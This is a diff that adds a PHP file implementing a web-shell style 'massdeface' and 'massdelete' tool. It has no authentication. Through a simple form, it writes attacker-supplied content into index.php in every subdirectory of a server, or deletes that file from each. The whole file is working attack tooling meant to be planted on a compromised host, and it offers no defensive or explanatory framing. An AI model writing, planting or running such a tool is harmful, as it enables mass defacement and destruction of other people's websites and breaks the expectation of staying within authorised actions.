@@ -1,0 +1,39 @@
+<?php
+function massdeface($dir, $filename, $text) {
+	$scdir = @scandir($dir) or die("Fuvk");
+	foreach ($scdir as $file) {
+		if ($file != '.' && $file != '..' && @filetype($file) == 'dir') {
+			$index = @getcwd().'/'.$file.'/'.$filename;
+			if (@file_put_contents($index, $text)) {
+				print("".$index."OK <br>");
+			}
+		}
+	}
+}
+function massdelete($dir, $filename) {
+	$scdir = @scandir($dir);
+	foreach ($scdir as $file) {
+		if ($file != '.' && $file != '..') {
+			$index = @getcwd().'/'.$file.'/'.$filename;
+			if (@unlink($index)) {
+				print("".$index." OK <br>");
+			}
+		}
+	}
+}
+if (isset($_POST['submit'])) {
+	if ($_POST['type'] == 'massdeface') {
+		@massdeface($_POST['dir'], $_POST['filename'], $_POST['text']);
+	} if ($_POST['type'] == 'massdelete') {
+		@massdelete($_POST['dir'], $_POST['filename']);
+	}
+}
+?>
+<form method="post">
+	<input type="radio" name="type" value="massdeface" checked> Massdeface
+	<input type="radio" name="type" value="massdelete"> Massdelete<br>
+	<input type="text" name="dir" value="<?php print @getcwd() ?>"><br>
+	<input type="text" name="filename" value="index.php"><br>
+	<textarea name="text" placeholder="Put your script"></textarea><br>
+	<input type="submit" name="submit">
+</form>
